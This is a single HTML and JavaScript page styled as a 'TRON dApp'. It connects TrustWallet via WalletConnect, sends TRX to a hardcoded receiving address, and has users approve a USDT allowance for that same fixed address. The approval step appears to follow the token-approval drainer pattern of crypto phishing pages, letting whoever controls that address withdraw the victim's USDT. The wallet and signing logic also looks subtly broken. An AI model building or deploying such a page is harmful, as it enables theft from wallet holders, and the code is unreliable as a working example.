<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON dApp - WalletConnect</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .connect-section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .btn {
            width: 100%;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: #f0f0f0;
            color: #333;
            margin-top: 10px;
        }

        .btn-secondary:hover:not(:disabled) {
            background: #e0e0e0;
        }

        .wallet-info {
            background: #f9f9f9;
            border-left: 4px solid #667eea;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
            display: none;
        }

        .wallet-info.active {
            display: block;
        }

        .wallet-info p {
            color: #666;
            font-size: 13px;
            margin-bottom: 8px;
            word-break: break-all;
        }

        .wallet-info p strong {
            color: #333;
            display: block;
            margin-bottom: 4px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }

        .form-group input:disabled {
            background: #f5f5f5;
            cursor: not-allowed;
        }

        .section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid #f0f0f0;
        }

        .section:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .section h3 {
            color: #333;
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }

        .section h3::before {
            content: '';
            display: inline-block;
            width: 4px;
            height: 20px;
            background: #667eea;
            border-radius: 2px;
            margin-right: 10px;
        }

        .status {
            padding: 12px 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
            display: none;
        }

        .status.active {
            display: block;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .status.loading {
            background: #cfe2ff;
            color: #084298;
            border: 1px solid #b6d4fe;
        }

        .status a {
            color: inherit;
            font-weight: 600;
            text-decoration: underline;
        }

        .qr-container {
            display: none;
            text-align: center;
            margin: 20px 0;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 8px;
        }

        .qr-container.active {
            display: block;
        }

        .qr-container svg,
        .qr-container canvas {
            max-width: 250px;
            height: auto;
            border: 2px solid #667eea;
            border-radius: 8px;
            background: white;
            margin: 0 auto;
            display: block;
        }

        .qr-label {
            color: #666;
            font-size: 13px;
            margin-top: 10px;
        }

        .balance {
            font-size: 14px;
            color: #666;
            margin-top: 10px;
        }

        .uri-display {
            background: #f5f5f5;
            padding: 10px;
            border-radius: 6px;
            font-size: 11px;
            word-break: break-all;
            margin-top: 10px;
            color: #666;
            max-height: 100px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 TRON dApp</h1>
            <p>Send TRON & Approve USDT via TrustWallet</p>
        </div>

        <!-- Wallet Connection Section -->
        <div class="connect-section">
            <button id="connectBtn" class="btn btn-primary">Connect TrustWallet</button>
            <button id="disconnectBtn" class="btn btn-secondary" style="display: none;">Disconnect</button>
            
            <div id="qrContainer" class="qr-container">
                <div id="qrCode"></div>
                <div class="qr-label">📱 Scan with TrustWallet</div>
                <div class="uri-display" id="uriDisplay"></div>
            </div>

            <div id="walletInfo" class="wallet-info">
                <p><strong>✓ Connected Wallet:</strong> <span id="walletAddress"></span></p>
                <p id="balance" class="balance"></p>
            </div>
        </div>

        <!-- Send TRON Section -->
        <div class="section">
            <h3>Send TRON</h3>
            <div class="form-group">
                <label for="tronAmount">Amount (TRX):</label>
                <input 
                    type="number" 
                    id="tronAmount" 
                    placeholder="Enter amount in TRX" 
                    step="0.1"
                    min="0"
                    disabled
                >
            </div>
            <button id="sendTronBtn" class="btn btn-primary" disabled>Send TRON</button>
            <div id="tronStatus" class="status"></div>
        </div>

        <!-- Approve USDT Section -->
        <div class="section">
            <h3>Approve USDT</h3>
            <div class="form-group">
                <label for="usdtAmount">Amount (USDT):</label>
                <input 
                    type="number" 
                    id="usdtAmount" 
                    placeholder="Enter amount to approve" 
                    step="0.01"
                    min="0"
                    disabled
                >
            </div>
            <button id="approveUsdtBtn" class="btn btn-primary" disabled>Approve USDT</button>
            <div id="usdtStatus" class="status"></div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.0/build/qrcode.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>

    <script>
        // Configuration
        const CONFIG = {
            PROJECT_ID: '171db6da15a54effc1b4a06f889a3c3f',
            RECEIVING_ADDRESS: 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV',
            USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            RPC_URL: 'https://api.trongrid.io',
            CHAIN_ID: 195 // TRON Mainnet on WalletConnect
        };

        // State
        let web3Provider = null;
        let tronWeb = null;
        let currentAccount = null;
        let sessionTopic = null;

        // UI Elements
        const connectBtn = document.getElementById('connectBtn');
        const disconnectBtn = document.getElementById('disconnectBtn');
        const qrContainer = document.getElementById('qrContainer');
        const qrCode = document.getElementById('qrCode');
        const uriDisplay = document.getElementById('uriDisplay');
        const walletInfo = document.getElementById('walletInfo');
        const walletAddress = document.getElementById('walletAddress');
        const balanceEl = document.getElementById('balance');
        const tronAmountInput = document.getElementById('tronAmount');
        const sendTronBtn = document.getElementById('sendTronBtn');
        const tronStatus = document.getElementById('tronStatus');
        const usdtAmountInput = document.getElementById('usdtAmount');
        const approveUsdtBtn = document.getElementById('approveUsdtBtn');
        const usdtStatus = document.getElementById('usdtStatus');

        // Initialize TronWeb
        function initTronWeb() {
            tronWeb = new TronWeb({
                fullHost: CONFIG.RPC_URL,
                headers: { 'YWVT-UUID': 'YOUR-UUID-HERE' }
            });
        }

        // Generate QR Code
        function generateQRCode(uri) {
            qrCode.innerHTML = '';
            uriDisplay.textContent = uri;
            
            QRCode.toCanvas(qrCode, uri, {
                errorCorrectionLevel: 'H',
                type: 'image/jpeg',
                quality: 0.95,
                margin: 1,
                width: 250,
                color: {
                    dark: '#667eea',
                    light: '#ffffff'
                }
            }, function (error) {
                if (error) {
                    console.error('QR Code error:', error);
                    qrCode.innerHTML = '<p style="color: red;">Error generating QR code</p>';
                }
            });

            qrContainer.classList.add('active');
        }

        // Connect Wallet
        connectBtn.addEventListener('click', async () => {
            try {
                showStatus(tronStatus, 'Initializing WalletConnect...', 'loading');
                
                // Create WalletConnect provider
                const provider = new WalletConnectProvider.default({
                    infuraId: CONFIG.PROJECT_ID,
                    chainId: CONFIG.CHAIN_ID,
                    rpc: {
                        195: CONFIG.RPC_URL
                    },
                    qrcode: false // Disable built-in QR, we'll generate our own
                });

                web3Provider = provider;

                // Listen for URI event
                provider.on('display_uri', (uri) => {
                    console.log('WalletConnect URI:', uri);
                    generateQRCode(uri);
                    showStatus(tronStatus, '📱 Scan the QR code with TrustWallet', 'info');
                });

                // Listen for connect event
                provider.on('connect', (payload) => {
                    console.log('Connected:', payload);
                    const { accounts, chainId } = payload;
                    if (accounts && accounts.length > 0) {
                        onWalletConnected(accounts[0]);
                    }
                });

                // Listen for session update
                provider.on('session_update', (payload) => {
                    console.log('Session updated:', payload);
                });

                // Listen for disconnect
                provider.on('disconnect', (error) => {
                    console.log('Disconnected:', error);
                    onWalletDisconnected();
                });

                // Trigger connection
                await provider.enable();

            } catch (error) {
                console.error('Connection error:', error);
                showStatus(tronStatus, `Error: ${error.message}`, 'error');
            }
        });

        // Wallet Connected Handler
        function onWalletConnected(address) {
            currentAccount = address;
            initTronWeb();
            
            walletAddress.textContent = address;
            walletInfo.classList.add('active');
            connectBtn.style.display = 'none';
            disconnectBtn.style.display = 'block';
            qrContainer.classList.remove('active');
            tronAmountInput.disabled = false;
            sendTronBtn.disabled = false;
            usdtAmountInput.disabled = false;
            approveUsdtBtn.disabled = false;

            fetchBalance(address);
            clearStatus(tronStatus);
            clearStatus(usdtStatus);
            showStatus(tronStatus, `✓ Connected to ${address.substring(0, 10)}...`, 'success');
        }

        // Disconnect Wallet
        disconnectBtn.addEventListener('click', async () => {
            try {
                if (web3Provider) {
                    await web3Provider.disconnect();
                }
            } catch (error) {
                console.error('Disconnect error:', error);
            }
            onWalletDisconnected();
        });

        function onWalletDisconnected() {
            currentAccount = null;
            web3Provider = null;
            tronWeb = null;

            walletInfo.classList.remove('active');
            qrContainer.classList.remove('active');
            connectBtn.style.display = 'block';
            disconnectBtn.style.display = 'none';
            tronAmountInput.disabled = true;
            sendTronBtn.disabled = true;
            usdtAmountInput.disabled = true;
            approveUsdtBtn.disabled = true;
            tronAmountInput.value = '';
            usdtAmountInput.value = '';

            clearStatus(tronStatus);
            clearStatus(usdtStatus);
        }

        // Fetch Balance
        async function fetchBalance(address) {
            try {
                const response = await fetch(`${CONFIG.RPC_URL}/v1/accounts/${address}`);
                const data = await response.json();
                const balanceSun = data.data && data.data[0] ? data.data[0].balance : 0;
                const balanceTRX = balanceSun / 1000000;
                balanceEl.textContent = `💰 Balance: ${balanceTRX.toFixed(6)} TRX`;
            } catch (error) {
                console.error('Error fetching balance:', error);
                balanceEl.textContent = '💰 Balance: Unable to fetch';
            }
        }

        // Send TRON
        sendTronBtn.addEventListener('click', async () => {
            const amount = parseFloat(tronAmountInput.value);
            
            if (!amount || amount <= 0) {
                showStatus(tronStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(tronStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(tronStatus, 'Preparing transaction...', 'loading');
                sendTronBtn.disabled = true;

                // Create transaction
                const tx = await tronWeb.transactionBuilder.sendTrx(
                    CONFIG.RECEIVING_ADDRESS,
                    tronWeb.toSun(amount),
                    currentAccount
                );

                // Sign transaction
                const signedTx = await tronWeb.trx.sign(tx);

                // Broadcast transaction
                const result = await tronWeb.trx.sendRawTransaction(signedTx);

                if (result.result) {
                    const txid = result.txid;
                    showStatus(
                        tronStatus,
                        `✓ Success! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`,
                        'success'
                    );
                    tronAmountInput.value = '';
                    fetchBalance(currentAccount);
                } else {
                    showStatus(tronStatus, `Transaction failed: ${result.message || 'Unknown error'}`, 'error');
                }
            } catch (error) {
                console.error('Send error:', error);
                showStatus(tronStatus, `Error: ${error.message || error}`, 'error');
            } finally {
                sendTronBtn.disabled = false;
            }
        });

        // Approve USDT
        approveUsdtBtn.addEventListener('click', async () => {
            const amount = parseFloat(usdtAmountInput.value);
            
            if (!amount || amount <= 0) {
                showStatus(usdtStatus, 'Please enter a valid amount', 'error');
                return;
            }

            if (!currentAccount || !tronWeb) {
                showStatus(usdtStatus, 'Wallet not connected', 'error');
                return;
            }

            try {
                showStatus(usdtStatus, 'Preparing approval...', 'loading');
                approveUsdtBtn.disabled = true;

                // USDT TRC20 Contract ABI
                const abi = [
                    {
                        "constant": false,
                        "inputs": [
                            { "name": "_spender", "type": "address" },
                            { "name": "_value", "type": "uint256" }
                        ],
                        "name": "approve",
                        "outputs": [{ "name": "", "type": "bool" }],
                        "type": "function"
                    }
                ];

                // Convert amount to USDT (6 decimals)
                const usdtAmount = (amount * 1000000).toString();

                // Create contract instance
                const contract = await tronWeb.contract(abi, CONFIG.USDT_CONTRACT);

                // Create transaction
                const unSignedTxn = await contract.approve(
                    CONFIG.RECEIVING_ADDRESS,
                    usdtAmount
                ).send({
                    from: currentAccount
                });

                // Sign transaction
                const signedTxn = await tronWeb.trx.sign(unSignedTxn);

                // Broadcast transaction
                const result = await tronWeb.trx.sendRawTransaction(signedTxn);

                if (result.result) {
                    const txid = result.txid;
                    showStatus(
                        usdtStatus,
                        `✓ Success! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">View on TronScan</a>`,
                        'success'
                    );
                    usdtAmountInput.value = '';
                } else {
                    showStatus(usdtStatus, `Approval failed: ${result.message || 'Unknown error'}`, 'error');
                }

            } catch (error) {
                console.error('Approval error:', error);
                showStatus(usdtStatus, `Error: ${error.message || error}`, 'error');
            } finally {
                approveUsdtBtn.disabled = false;
            }
        });

        // Utility Functions
        function showStatus(element, message, type) {
            element.className = `status active ${type}`;
            element.innerHTML = message;
        }

        function clearStatus(element) {
            element.className = 'status';
            element.innerHTML = '';
        }

        // Auto-refresh balance every 30 seconds
        setInterval(() => {
            if (currentAccount) {
                fetchBalance(currentAccount);
            }
        }, 30000);
    </script>
</body>
</html>
